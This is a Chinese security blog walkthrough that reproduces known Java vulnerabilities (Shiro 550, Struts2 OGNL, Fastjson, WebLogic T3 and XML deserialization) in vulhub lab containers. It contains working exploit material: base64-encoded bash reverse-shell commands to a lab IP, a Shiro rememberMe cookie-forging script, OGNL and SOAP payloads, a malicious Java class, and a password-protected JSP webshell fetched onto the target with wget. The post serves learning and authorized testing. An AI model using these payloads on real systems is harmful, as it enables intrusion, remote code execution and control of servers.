> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzU2MjY1ODEwMA==&mid=2247492212&idx=1&sn=d5b473f62fc06b60c4bf8a71d3bd2de1

#  JAVA常见漏洞复现  
quan9i  知微守望   2025-07-03 09:40  
  
# Shiro  
## Shiro 550  
### 漏洞原理  
  
**Shiro550**  
漏洞原理是Shiro框架提供了一种记住密码(Rememberme)的功能，用户登录成功后会生成经过加密的Cookie值，对Remembe的Cookie进行AES解密、Base64解密后再反序列化，就导致了反序列化RCE漏洞 。 Shiro<1.2.4版本，其使用的密钥为固定密钥
```
Shiro550kPH+bIxk5D2deZiIxcaaaA==
```

  
，这就更容易导致RCE漏洞  
### 漏洞复现  
  
用vulhub复现  

```
cd vulhub/shiro/CVE-2016-4437
```

  
而后开启服务  

```
docker-compose up -d 
//-d是后台运行，加不加皆可
```

  
![image-20230418233245340](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5BhpMITg7bku4uZ3Y375ArV2uib4S582ic46LFsGHRaIM4sEGwNDuvECg/640?wx_fmt=png&from=appmsg "")  
  
访问  
  
![image-20230418233350484](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5GapE0NbbHSXvwJ1SqHERY7N2eWqCbmRse0Nu00cJN2O6g6vd0jb8Og/640?wx_fmt=png&from=appmsg "")  
#### 脚本  
  
攻击端开启监听  
  
![image-20230418235121526](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5ZNCWHwFeNzJSIE4perclZdjG9sqnav4vjLQxQqc2Q27dNXib2icm5bbw/640?wx_fmt=png&from=appmsg "")  
  
而后构造反弹shell语句，在线生成编码后的反弹shell网站  
  
https://ares-x.com/tools/runtime-exec  

```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTI5LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}
//bash -c {echo,bash -i >& /dev/tcp/192.168.1.129/6666 0>&1}|{base64,-d}|{bash,-i}
```

  
而后通过
```
ysoserial
```

  
工具的JRMP监听6666端口并执行反弹shell指令  
  
**这里我们相当于在攻击机上启动了一个VPS服务，监听7777端口，然后在这个服务上放了一个反弹shell的payload，并用序列化工具ysoserial指定 CommonsCollections5 利用链生成可执行bash -i >& /dev/tcp/192.168.200.131/6666 0>&1命令的序列化数据payload1。当后面有客户端请求服务时，我们搭建的这个JRMP就会返回这段payload1。**  

```
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener7777CommonsCollections5&#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTI5LzY2NjYgMD4mMQo=}|{base64,-d}|{bash,-i}&#34;
```

  
![image-20230419011409003](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5TicybicpnD9XXN02LuqeKEW6ibLMyJCVNJBEcRF2hdYSCZAEEFrxlIUCg/640?wx_fmt=png&from=appmsg "")  
  
接下来去利用密钥伪造**rememberMe**  
字段，脚本如下  

```
import sys
import uuid
import base64
import subprocess
from Crypto.Cipher import AES
defencode_rememberme(command):
    popen = subprocess.Popen(['java','-jar','ysoserial-all.jar','JRMPClient', command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad =lambda s: s +((BS -len(s)% BS)*chr(BS -len(s)% BS)).encode()
    key = base64.b64decode(&#34;kPH+bIxk5D2deZiIxcaaaA==&#34;)
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
return base64_ciphertext

if __name__ =='__main__':
    payload = encode_rememberme(sys.argv[1])
print&#34;rememberMe={0}&#34;.format(payload.decode())
```

  
而后运行**python2 shiro.py 192.168.1.129 7777**  
  
![image-20230419191959439](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK56Asyj2hhvtAb9nXd3jqmibOATAJxv0qP9PrhZVsKRnu2G6qwwXlHALw/640?wx_fmt=png&from=appmsg "")  
  
接下来对网站进行抓包，在Cookie中添加我们伪造的**rememberMe**  
参数  
  
![image-20230419185428696](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5krKCy4v5FgHoRCQhORzNWpRfFQOxPlXRjE3aPRG3DwN9VNeL0UuEqw/640?wx_fmt=png&from=appmsg "")  
  
此时查看，已成功反弹shell。  
#### 自动化工具  
  
![image-20230418234451793](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5Ej7d7BHojYicgUYeRtjGBe7KSf2x6WwhpdU3yc6TAG3PibxAHRlP6KIg/640?wx_fmt=png&from=appmsg "")  
## Shiro 721  
### 漏洞原理  
  
在用户进行登录的时候，Apache Shiro提供Rememberme功能，可以存储cookie，期间使用的是AES-128-CBC进行加密，可以通过Padding Oracle加密生成的攻击代码来重新构造一个恶意的rememberMe字段，重新请求网站，进行反序列化攻击，最终导致任意代码的执行。  
  
Shiro721是使用 登录后rememberMe= {value}去爆破正确的key值 进而反序列化，shiro721 本质上是 padding attack，爆破要弄很久。对比Shiro550条件只要有 足够密钥库 （条件较低）、Shiro721需要登录（要求较高 ）。  
# Struts2  
## 漏洞原理  
  
Struts2 漏洞的原理是由于 Struts2 框架中的一个组件，即 OGNL(Object-Graph Navigation Language) 表达式解析器，存在漏洞。OGNL 是一种强大的表达式语言，它允许开发人员在 Struts2 应用程序中使用动态表达式来访问和操作对象。但是，由于 OGNL 表达式解析器的实现不够安全，攻击者可以通过构造恶意 OGNL 表达式来执行任意代码。例如：**当用户提交表单数据并验证失败时，后端会将用户之前提交的参数值使用OGNL表达式%{value}进行解析，然后重新填充到对应的表单数据中。**  
## 漏洞检测  

```
.do或者 .action 的网站后缀
```

## 漏洞复现  
#### s2-001  
  
使用Vuldb靶场进行复现  

```
cd vulhub/struts2/s2-001
```

  
而后开启容器  

```
docker-compose up -d
```

  
![image-20230419194425781](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5nrhHpVgibgxTfnRaiawCBgUdA9SxUf2X5ny1m0b2T2jfGPj6lWb3fEuQ/640?wx_fmt=png&from=appmsg "")  
  
输入**%{1+2}**，结果变成3  
  
![image-20230419194653538](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK53JKDd0QXB5BYHYz7LGsPNibLLSwibHI8OZI6iaDDbl9ZpdTshibQiaBZWXA/640?wx_fmt=png&from=appmsg "")  
  
说明解析了，存在漏洞，查询tomact路径  

```
%{&#34;tomcatBinDir{&#34;+@java.lang.System@getProperty(&#34;user.dir&#34;)+&#34;}&#34;}
```

  
![image-20230419195600069](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5sFHgJOXr3ibYibN8OKewsLNY0xTLONUoyzy5n7AJ4cwrvtPs339f6Rog/640?wx_fmt=png&from=appmsg "")  
  
回显**tomcatBinDir{/usr/local/tomcat}**，成功实现命令执行  
#### s2-053  

```
cd vulhub/struts2/s2-053
docker-compose up -d
```

  
![image-20230419200514727](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5bkCKqKG1FZO5lDmrtxzqHcYjvk3JicCFBOAWbZsDnc6bbOzFetaaeQg/640?wx_fmt=png&from=appmsg "")  
  
访问环境**hello.action**  
  
![image-20230419200833587](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5KiamicE9YCyByqtMajjVs10rRAGmicvdmyO9x2icdqQqXiasybJ2b9gict0Q/640?wx_fmt=png&from=appmsg "")  
  
接下来查看监听  
  
![image-20230419203040680](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5S9J0ibsCibaF6v5icdomX0PHm9xpqkYub9QDDl6M413f4xfBt0pX6zFlw/640?wx_fmt=png&from=appmsg "")  
#### S2-061  
  
开启环境用vulhub  

```
cd vulhub/struts2/s2-061
docker-compose up -d
```

  
接下来抓包，而后修改为POST请求，发送反弹shell恶意指令  

```
------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name=&#34;id&#34;

%{(#instancemanager=#application[&#34;org.apache.tomcat.InstanceManager&#34;]).(#stack=#attr[&#34;com.opensymphony.xwork2.util.ValueStack.ValueStack&#34;]).(#bean=#instancemanager.newInstance(&#34;org.apache.commons.collections.BeanMap&#34;)).(#bean.setBean(#stack)).(#context=#bean.get(&#34;context&#34;)).(#bean.setBean(#context)).(#macc=#bean.get(&#34;memberAccess&#34;)).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(&#34;java.util.HashSet&#34;)).(#bean.put(&#34;excludedClasses&#34;,#emptyset)).(#bean.put(&#34;excludedPackageNames&#34;,#emptyset)).(#arglist=#instancemanager.newInstance(&#34;java.util.ArrayList&#34;)).(#arglist.add(&#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTI5LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}&#34;)).(#execute=#instancemanager.newInstance(&#34;freemarker.template.utility.Execute&#34;)).(#execute.exec(#arglist))}
------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
```

  
![image-20230419210122924](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK51dwib7GPQWx5Laic8H28q8gX0MxLFvoiafGyVMJ81VTUYLQxygcboicAjg/640?wx_fmt=png&from=appmsg "")  
# Fastjson  
## 漏洞原理  
  
目标网站在解析 json 时，未对 json 内容进行验证，直接将 json 解析成 java 对象并执行，这就给了攻击者可乘之机，构造对应的 payload ，让系统执行，然后达到代码执行，甚至命令执行的目的。  
  
**攻击者可以传入一个恶意构造的JSON内容，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行**  
。  
  
知识科普  
  
**JNDI是 Java 命名与目录接口（Java Naming and Directory Interface），在J2EE规范中是重要的规范之一。JNDI提供统一的客户端API，为开发人员提供了查找和访问各种命名和目录服务的通用、统一的接口，可以用来定位用户、网络、机器、对象和服务等各种资源。比如可以利用JNDI再局域网上定位一台打印机，也可以用JNDI来定位数据库服务或一个远程Java对象。JNDI底层支持RMI远程对象，RMI注册的服务可以通过JNDI接口来访问和调用。**  
  
**RMI（Remote Method Invocation）是专为Java环境设计的远程方法调用机制，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法。**  
  
**RMI依赖的通信协议为JRMP(Java Remote Message Protocol ，Java 远程消息交换协议)，该协议为Java定制，要求服务端与客户端都为Java编写。这个协议就像HTTP协议一样，规定了客户端和服务端通信要满足的规范。在RMI中对象是通过序列化方式进行编码传输的。RMI服务端可以直接绑定远程调用的对象以外，还可通过References类来绑定一个外部的远程对象，当RMI绑定了References之后，首先会利用Referenceable.getReference()获取绑定对象的引用，并在目录中保存，当客户端使用lookup获取对应名字时，会返回ReferenceWrapper类的代理文件，然后会调用getReference()获取Reference类，最终通过factory类将Reference转换为具体的对象实例。**  
## 漏洞复现  

```
cd vulhub/fastjson/1.2.24-rce
docker-compose up  -d
```

  
访问环境  
  
![image-20230420011047000](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5ZLQ2xJVTw5ZYg2xmVb2OFVW9Q3fdEJTXXdDIXhU9urOIljHHX1c9GA/640?wx_fmt=png&from=appmsg "")  
  
在攻击机模拟json发送post请求  

```
curl http://192.168.1.129:8090/-H&#34;Content-Type: application/json&#34;--data '{&#34;name&#34;:&#34;karsa&#34;, &#34;age&#34;:22}'
```

  
![image-20230420011156121](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5iccMnTNszA3IqRiaLTVcdBFdAJOdOngrAyS5YhHXiaW3lETYbjn8JibvCw/640?wx_fmt=png&from=appmsg "")  
  
验证漏洞存在，接下来去打  
  
首先编辑恶意java代码  

```
// javac TouchFile.java
importjava.lang.Runtime;
importjava.lang.Process;

publicclassTouchFile{
static{
try{
Runtime rt =Runtime.getRuntime();
String[] commands ={&#34;touch&#34;,&#34;/tmp/success&#34;};
Process pc = rt.exec(commands);
            pc.waitFor();
}catch(Exception e){
// do nothing
}
}
}
```

  
对文件进行编译  

```
javac TouchFile.java
```

  
搭建HTTP服务传输文件  

```
python -m SimpleHTTPServer 1387
```

  
![image-20230420011353523](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5PJgNf2hmjmjHhG01E1YMb6JAibsiaIxcGbxNjx8qdAWFiaTY4zeiaibxVQw/640?wx_fmt=png&from=appmsg "")  
  
![image-20230420011725129](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5R8ibSqEHdpTbavAfAHH5mz9icRkZ2rOH7LkiclAI0b9yY7jwPN8Z8QZ7g/640?wx_fmt=png&from=appmsg "")  
  
接下来利用java反序列化工具  

```
git clone https://github.com/mbechler/marshalsec.git 下载marshalsec
apt-get install maven 安装maven
mvn clean package-DskipTests 使用maven编译marshalsec成jar包
```

  
启动RMI服务器，监听9999端口  

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer&#34;http://192.168.1.129:1387/#TouchFile&#34;9999
```

  
![image-20230420011506338](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5LiapUnB72fO2x1zG8kl2aJ3wb8V9TwqqTNvibS6U7dk2MicR02lDQ4LPw/640?wx_fmt=png&from=appmsg "")  
  
而后抓包，修改为POST请求，修改**Content-Type为 application/json**  
，而后传输如下数据  

```
{
&#34;b&#34;:{
&#34;@type&#34;:&#34;com.sun.rowset.JdbcRowSetImpl&#34;,
&#34;dataSourceName&#34;:&#34;rmi://192.168.1.129:9999/TouchFile&#34;,
&#34;autoCommit&#34;:true
}
}
```

  
![image-20230420011605096](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5qFYianQ2bdkqRjNwVqIb2Ad6ibmbnuWUuPSUVYZYBOuU4I9HyYic3K7SA/640?wx_fmt=png&from=appmsg "")  
  
而后查看容器中的/tmp下已成功生成**success**  
，反弹shell同理，只需要更改代码即可  

```
// javac TouchFile.java
importjava.lang.Runtime;
importjava.lang.Process;

publicclassTouchFile{
static{
try{
Runtime rt =Runtime.getRuntime();
String[] commands ={&#34;/bin/bash&#34;,&#34;-c&#34;,&#34;bash -i >& /dev/tcp/192.168.1.129/6666 0>&1&#34;};
Process pc = rt.exec(commands);
            pc.waitFor();
}catch(Exception e){
// do nothing
}
}
}
```

# Log4j2  
## 漏洞原理  
  
log4j2框架下的**lookup查询服务**  
提供了**{}**字段解析功能，传进去的值会被直接解析。例如**  
${java:version}**会被替换为对应的java版本。这样如果不对lookup的出栈进行限制，就有可能让查询指向任何服务（可能是攻击者部署好的恶意代码）。  
  
攻击者可以利用这一点进行**JNDI注入**  
，使得受害者请求远程服务来链接本地对象，在lookup的{}里面构造payload，调用JNDI服务（LDAP）向攻击者提前部署好的恶意站点获取恶意的**.class对象**，造成了远程代码执行（可反弹shell到指定服务器）。  
# Weblogic  
## T3反序列化漏洞  
  
**Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中, 并创建T3协议通信连接, 将流量传输到Java虚拟机. T3协议在开放WebLogic控制台端口的应用上默认开启. 攻击者可以**  
  
**通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击。**  
### 漏洞复现  
  
准备反弹shell指令如下  

```
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTI5LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}
//Base64编码的内容为bash -i >& /dev/tcp/192.168.1.129/6666 0>&1
```

  
接下来开启监听  
  
![image-20230420135029363](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5CNGI1PXgvMGxgV58DSnmld9rcRhw49pUibYbeTticjDpqFQoUkicLab4A/640?wx_fmt=png&from=appmsg "")  
  
接下来利用反序列化工具**ysoserial.jar**  

```
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener9999CommonsCollections1'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTI5LzY2NjYgMD4mMQ==}|{base64,-d}|{bash,-i}'
```

  
![image-20230420141739301](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5l3J6eU1kz2Kk6pfSOPbvjn2Hyt5hOjum19dKOGUHNsYluaZpd953FA/640?wx_fmt=png&from=appmsg "")  
  
接下来下载Exp进行攻击，  
  
**Exp地址：https://www.exploit-db.com/exploits/44553**  
  
复制代码到**Exploit.py**  
中，接下来执行如下指令  

```
python2 Exploit.py 192.168.1.1297001/tools/weblogic/ysoserial-all.jar 192.168.1.1299999JRMPClient
```

  
![image-20230420142121751](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5eRu20YRLlFYLiadT4hOrKEXg5twXjnoGWRVFkrJgCnrXB4aXsMDQpbg/640?wx_fmt=png&from=appmsg "")  
  
此时查看监听处  
  
![image-20230420142144309](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5Dm9VEUiaHQ6J47hia4BYKRsVicMkpA740XUKT3uYTA5osib9Gtg9RSmudA/640?wx_fmt=png&from=appmsg "")  
  
成功反弹shell  
## XML漏洞  
#### 漏洞复现  
  
Vulhub复现  

```
cd vulhub/weblogic/CVE-2017-10271
docker-compose up  -d
```

  
开启环境后访问**http://192.168.1.129:7001/_async/AsyncResponseService**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK53CxAdDq4KcUJup8SYiaG3xtPN1yFWwia5cIoIxCePr0Kzr7m486CqZbg/640?wx_fmt=png&from=appmsg "")  
  
访问成功说明存在漏洞  
  
写入**shell.txt**  
文件，内容如下  

```
<%
if(&#34;123&#34;.equals(request.getParameter(&#34;pwd&#34;))){
java.io.InputStream in =Runtime.getRuntime().exec(request.getParameter(&#34;cmd&#34;)).getInputStream();
int a =-1;
byte[] b =newbyte[1024];
        out.print(&#34;<pre>&#34;);
while((a=in.read(b))!=-1){
            out.println(newString(b));
}
        out.print(&#34;</pre>&#34;);
}
%>
```

  
接下来开启http服务，使得它可以被访问  

```
python -m SimpleHTTPServer 1387
```

  
![image-20230420121959310](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5Tk2LXh0mdEkZqudE3s5jRs906HSbwUNUuIGmqZ5MOzatExRA6OQxtQ/640?wx_fmt=png&from=appmsg "")  
  
在浏览器访问  
  
![image-20230420122017707](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK54Hzg0go2FplM9qWaOC0Vk2ibPXtb9icoHgeB63SplPyEowKtkRibsgpibQ/640?wx_fmt=png&from=appmsg "")  
  
接下来就可以直接打了，更改**Content-Type为:text/xml**  
，而后传输POST数据如下  

```
<soapenv:Envelope
xmlns:soapenv=&#34;http://schemas.xmlsoap.org/soap/envelope/&#34; xmlns:wsa=&#34;http://www.w3.org/2005/08/addressing&#34; xmlns:asy=&#34;http://www.bea.com/async/AsyncResponseService&#34;>
<soapenv:Header>
<wsa:Action>xx</wsa:Action>
<wsa:RelatesTo>xx</wsa:RelatesTo>
<work:WorkContext xmlns:work=&#34;http://bea.com/2004/06/soap/workarea/&#34;>
<voidclass=&#34;java.lang.ProcessBuilder&#34;>
<array class=&#34;java.lang.String&#34; length=&#34;3&#34;>
<void index=&#34;0&#34;>
<string>/bin/bash</string>
</void>
<void index=&#34;1&#34;>
<string>-c</string>
</void>
<void index=&#34;2&#34;>
<string>wget http://192.168.1.129:1387/shell.txt -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/shell.jsp</string>
</void>
</array>
<void method=&#34;start&#34;/></void>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body>
<asy:onAsyncDelivery/>
</soapenv:Body></soapenv:Envelope>
```

  
![image-20230420121756747](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5MhTQFHoQfDctFUo35gXYK4icBbWW0enuDFNAfBP82iazTHziapbAknzyA/640?wx_fmt=png&from=appmsg "")  
  
状态202则说明成功写入，接下来去访问这个木马文件并尝试执行命令  
  
![image-20230420121831475](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5nP2WacicEBd9dkiacCKUowsJAzMuM0kEVdOn09ibMBs5icBXBsKNTIbeibw/640?wx_fmt=png&from=appmsg "")  
  
![image-20230420121850723](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5VVQww0eqynIauDWibD79CqmWHqDmbJRuic23EYfLcIgA8t50icqytn2ow/640?wx_fmt=png&from=appmsg "")  
  
成功实现命令执行  
## iiop反序列化漏洞  
  
**漏洞主要原因是错误的过滤JtaTransactionManager类，JtaTransactionManager父类AbstractPlatformTransactionManager在之前的补丁里面就加入到黑名单列表了,T3协议使用的是resolveClass方法去过滤的,resolveClass方法是会读取父类的,所以T3协议这样过滤是没问题的。但是IIOP协议这块,虽然也是使用的这个黑名单列表,但不是使用resolveClass方法去判断的,这样默认只会判断本类的类名,而JtaTransactionManager类是不在黑名单列表里面的,它的父类才在黑名单列表里面,这样就可以反序列化JtaTransactionManager类了,而JtaTransactionManager类是存在jndi注入的。**  
## SSRF漏洞  
  
**weblogic中存在SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件**  
# 其他  
  
中间出了一点小Bug，就是我没安装javac，只有java，但安装了过后发现无法运行jar包了  
  
![image-20230420141640717](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5sEFNPsV9YOTf7xHPsn3OWkSj8KgI5fX6XuoU3jEOe8HqU1XaIdiazHw/640?wx_fmt=png&from=appmsg "")  
  
百度过后发现是jdk版本的问题，我们可以使用下面指令来切换JDK版本  

```
update-alternatives --config java 
```

  
![image-20230420141703012](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5iasg7AgQsShnajKDzK0ibYfV9lSzJ80tCxFb1aUvGc8CHaYzIuHpfuiaQ/640?wx_fmt=png&from=appmsg "")  
  
更改为低版本后成功运行jar包  
  
![image-20230420141722679](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVyur6ib7hCrUaib9GVDnc1EK5T7CDxJIpLTuNlb5vEHOZd9ibibO2gZlMvWlF89gxHjsJLEEG8TjiaicTicg/640?wx_fmt=png&from=appmsg "")  
  
参考链接  

```
https://quan9i.top/post/%E5%B8%B8%E8%A7%81JAVA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0
```

  
真心感觉自己要学习的知识好多，也有好多大神卧虎藏龙、开源分享。作为初学者，我们可能有差距，不论你之前是什么方向，是什么工作，是什么学历，是大学大专中专，亦或是高中初中，只要你喜欢安全，喜欢渗透，就朝着这个目标去努力吧！有差距不可怕，我们需要的是去缩小差距，去战斗，况且这个学习的历程真的很美，安全真的有意思。但切勿去做坏事，我们需要的是白帽子，是维护我们的网络，安全路上共勉。  
  
  
**本文版权归作者和微信公众号平台共有，重在学习交流，不以任何盈利为目的，欢迎转载。**  
  
****  
**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。公众号内容中部分攻防技巧等只允许在目标授权的情况下进行使用，大部分文章来自各大安全社区，个人博客，如有侵权请立即联系公众号进行删除。若不同意以上警告信息请立即退出浏览！！！**  
  
****  
**敲敲小黑板：《刑法》第二百八十五条　【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。**  
  
  
